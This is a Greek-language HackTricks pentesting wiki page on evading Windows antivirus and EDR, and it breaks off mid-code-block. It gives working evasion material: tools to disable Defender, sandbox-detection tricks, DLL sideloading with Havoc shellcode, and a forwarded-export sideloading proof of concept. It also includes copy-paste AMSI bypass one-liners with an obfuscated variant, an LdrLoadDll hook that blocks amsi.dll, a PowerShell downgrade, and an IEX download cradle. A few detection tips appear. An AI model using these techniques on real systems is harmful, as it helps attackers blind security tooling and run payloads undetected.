# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Απενεργοποίηση Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για να σταματήσει το Windows Defender να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο που σταματά το Windows Defender, προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Μεθοδολογία αποφυγής AV**

Αυτή τη στιγμή, τα AV χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Η στατική ανίχνευση επιτυγχάνεται σηματοδοτώντας γνωστές κακόβουλες συμβολοσειρές ή πίνακες bytes σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε πιάσει πιο εύκολα, αφού πιθανότατα έχουν ήδη αναλυθεί και χαρακτηριστεί κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψεις αυτούς τους ελέγχους:

- **Encryption**

  Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για τα AV να ανιχνεύσουν το πρόγραμμα, αλλά θα χρειαστείς κάποιο είδος loader για να το αποκρυπτογραφήσεις και να το τρέξεις στη μνήμη.

- **Obfuscation**

  Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις κάποιες συμβολοσειρές στο binary ή script για να το περάσεις από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να αποκρύψεις.

- **Custom tooling**

  Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχουν γνωστές κακές signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για έλεγχο απέναντι στη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά segments και έπειτα ζητά από τον Defender να σαρώσει το καθένα ξεχωριστά· έτσι μπορεί να σου πει ακριβώς ποιες συμβολοσειρές ή bytes σηματοδοτούνται στο binary σου.

Συστήνω ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτική AV Evasion.

### **Dynamic analysis**

Η δυναμική ανάλυση είναι όταν το AV τρέχει το binary σου σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τα passwords του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας πολύ καλός τρόπος για να παρακάμψεις τη δυναμική ανάλυση των AV. Τα AV έχουν πολύ μικρό χρόνο για να σαρώσουν αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandbox των AV μπορούν απλά να παρακάμψουν το sleep ανάλογα με το πώς είναι υλοποιημένο.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τον υπολογιστή του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα — δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο workstation είναι joined στο domain "contoso.local", μπορείς να κάνεις ένα check στο domain του υπολογιστή να δεις αν ταιριάζει με το οποίο όρισες· αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείς να ελέγξεις το όνομα του υπολογιστή στο malware πριν την ενεργοποίηση· αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για το πώς να αντιπαρατεθείς με Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως είπαμε και πριν, τα **public tools** τελικά **θα ανιχνευτούν**, οπότε πρέπει να αναρωτηθείς κάτι:

Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή μπορείς να χρησιμοποιήσεις ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS;

Η σωστή απάντηση είναι πιθανώς το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι ίσως ένα από τα πιο σηματοδοτημένα/ανιχνευμένα εργαλεία από τα AVs και EDRs — ενώ το project ίδιο είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις μαζί του για να ξεφύγεις από AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, βεβαιώσου να **απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων** στον defender, και σε παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΆΖΕΙΣ ΣΤΟ VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion μακροπρόθεσμα. Αν θέλεις να ελέγξεις αν το payload σου ανιχνεύεται από κάποιο συγκεκριμένο AV, εγκατάστησέ το σε VM, προσπάθησε να απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων, και δοκίμασε εκεί μέχρι να είσαι ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε τη χρήση DLLs για evasion** — από την εμπειρία μου, τα DLL αρχεία συνήθως **ανιχνεύονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε κάποιες περιπτώσεις (αν το payload σου μπορεί να τρέξει ως DLL φυσικά).

Όπως βλέπουμε στην εικόνα, ένα DLL Payload από το Havoc έχει rate ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός κανονικού Havoc EXE payload vs ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με DLL αρχεία για να είσαι πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται τη DLL search order που χρησιμοποιεί ο loader, τοποθετώντας το victim application και το κακόβουλο payload/τα δίπλα-δίπλα.

Μπορείς να ελέγξεις για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα με τα προγράμματα που είναι επιρρεπή σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας DLL Hijackable/Sideloadable programs**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable programs, μπορεί να συλληφθείτε εύκολα.

Απλά τοποθετώντας ένα malicious DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να επιλύσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (and malicious) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL, και την αρχική μετονομασμένη DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded with [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας συνιστώ ανεπιφύλακτα να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σε μεγαλύτερο βάθος σχετικά με όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει μια ASCII συμβολοσειρά της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Θα φορτώσει το `TargetDll` αν δεν έχει ήδη φορτωθεί
- Θα επιλύσει την `TargetFunc` από αυτό

Βασικές συμπεριφορές προς κατανόηση:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, που περιλαμβάνει τον κατάλογο του module που εκτελεί την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια συνάρτηση forwarded προς ένα module name που δεν είναι KnownDLL, και στη συνέχεια τοποθετήστε το signed DLL στον ίδιο κατάλογο με ένα attacker-controlled DLL που έχει ακριβώς το ίδιο όνομα με το forwarded target module. Όταν η forwarded export καλείται, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα που παρατηρήθηκε σε Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL του συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για να επιτευχθεί εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε την προωθημένη συνάρτηση για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Εάν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Συμβουλές ανίχνευσης:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Οι KnownDLLs αναφέρονται κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder των Windows 11 για να βρείτε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Ιδέες ανίχνευσης/άμυνας:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από μη συστημικά μονοπάτια, και στη συνέχεια φορτώνουν μη‑KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Εφαρμόστε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε write+execute σε καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — αυτό που λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε αποκλειστικά σε ένα εργαλείο. Αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.

## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο αρχεία στον δίσκο, οπότε αν με κάποιο τρόπο μπορούσατε να εκτελέσετε payloads απευθείας in-memory, το AV δεν μπορούσε να κάνει τίποτα για να το σταματήσει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα ακόλουθα στοιχεία των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάσουν τη συμπεριφορά scripts αποκαλύπτοντας το περιεχόμενο των scripts με τρόπο μη κρυπτογραφημένο και μη obfuscated.

Το να τρέξετε `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράξει το ακόλουθο alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο τρέχει το script — σε αυτή την περίπτωση powershell.exe

Δεν γράψαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε in-memory λόγω του AMSI.

Επιπλέον, ξεκινώντας από **.NET 4.8**, και ο C# κώδικας περνάει από AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή χαμηλότερα) για in-memory execution αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακαμφθεί το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να deobfuscate τα scripts ακόμα κι αν έχουν πολλαπλά επίπεδα obfuscation, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που υλοποιείται. Αυτό την καθιστά όχι τόσο απλή στην παράκαμψη. Παρ' όλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και λειτουργεί — εξαρτάται πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας ένα DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατόν να το τροποποιήσει κανείς εύκολα ακόμη και όταν τρέχει ως unprivileged user. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους για να αποφύγουν το AMSI scanning.

**Πρόκληση σφάλματος**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μια γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε δεν θα πρέπει να δημοσιεύσετε οποιονδήποτε κώδικα αν σκοπεύετε να παραμείνετε αθέατοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στην amsi.dll (υπεύθυνη για τη σάρωση των δεδομένων που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, που ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να bypass το AMSI με powershell — δείτε [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Μπλοκάρισμα του AMSI αποτρέποντας τη φόρτωση της amsi.dll (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού η `amsi.dll` φορτωθεί στην τρέχουσα διεργασία. Ένα αξιόπιστο, ανεξάρτητο από γλώσσα bypass είναι να τοποθετηθεί ένα user‑mode hook στην `ntdll!LdrLoadDll` που επιστρέφει σφάλμα όταν το ζητούμενο module είναι η `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται σάρωσεις για αυτή τη διεργασία.

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε που αλλιώς θα φόρτωνε το AMSI).
- Συνδύασέ το με αποστολή script μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγεις μακροσκελή artefacts στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` που καλεί `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Αφαίρεση της ανιχνευμένης υπογραφής**

Μπορείς να χρησιμοποιήσεις ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσεις την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια υπεργράφοντάς την με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR προϊόντα που χρησιμοποιούν το AMSI**

Μπορείς να βρεις λίστα με AV/EDR προϊόντα που χρησιμοποιούν το AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποίησε PowerShell έκδοσης 2**
Αν χρησιμοποιήσεις PowerShell έκδοσης 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να εκτελέσεις τα scripts σου χωρίς να σαρωθούν από το AMSI. Μπορείς να το κάνεις έτσι:
```bash
powershell.exe -version 2
```
## PS Καταγραφή

PowerShell logging είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για auditing και troubleshooting, αλλά μπορεί επίσης να αποτελεί ένα **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Εάν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να ξεκινήσετε ένα powershell χωρίς μηχανισμούς άμυνας (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Απόκρυψη (Obfuscation)

> [!TIP]
> Πολλές τεχνικές απόκρυψης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του δυαδικού αρχείου και καθιστά πιο εύκολη την ανίχνευσή του από AVs και EDRs. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Αποαποκρυπτογράφηση .NET δυαδικών προστατευμένων με ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι συνηθισμένο να αντιμετωπίζει κανείς πολλαπλά επίπεδα προστασίας που μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας αποκαθιστά αξιόπιστα ένα **κοντινό προς το αρχικό IL** που μπορεί στη συνέχεια να αποσυμπιεστεί σε C# σε εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum, οπότε οποιαδήποτε αλλαγή θα καταρρεύσει το δυαδικό. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε το δικό σας unpacker.

2.  Symbol / control-flow recovery – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Σημαίες:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά τις άμεσες κλήσεις με ελαφριά wrappers (a.k.a *proxy calls*) για να δυσκολέψει περαιτέρω την αποσυμπλοποίηση. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
